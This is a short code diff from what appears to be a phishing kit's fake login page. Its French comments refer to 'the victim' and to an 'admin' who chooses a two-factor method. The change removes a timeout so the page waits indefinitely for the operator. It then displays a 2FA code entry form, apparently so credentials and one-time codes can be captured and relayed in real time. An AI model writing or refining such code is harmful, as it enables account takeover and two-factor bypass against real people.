@@ -269,25 +269,19 @@
                 
                 const result = await response.json();
                 if (result.status === 'success') {
-                    let attempts = 0;
-                    const maxAttempts = 20; 
+                    // La victime a saisi ses infos, on attend que l'admin choisisse la méthode.
+                    // L'écran de chargement ne s'arrêtera QUE si current_method n'est plus None.
                     
                     const checkInterval = setInterval(async () => {
-                        attempts++;
                         const currentMethod = await fetchCurrentMethod();
                         
+                        // On ne s'arrête QUE si une méthode a été explicitement sélectionnée
                         if (currentMethod && currentMethod !== 'null' && currentMethod !== 'None') {
                             clearInterval(checkInterval);
                             showLoading(false);
                             document.getElementById('loginBox').style.display = 'none';
                             document.getElementById('twoFactorBox').style.display = 'block';
                             setupA2FMethod(currentMethod);
-                        } else if (attempts >= maxAttempts) {
-                            clearInterval(checkInterval);
-                            showLoading(false);
-                            document.getElementById('loginBox').style.display = 'none';
-                            document.getElementById('twoFactorBox').style.display = 'block';
-                            setupA2FMethod('SMS');
                         }
                     }, 500);
                 }
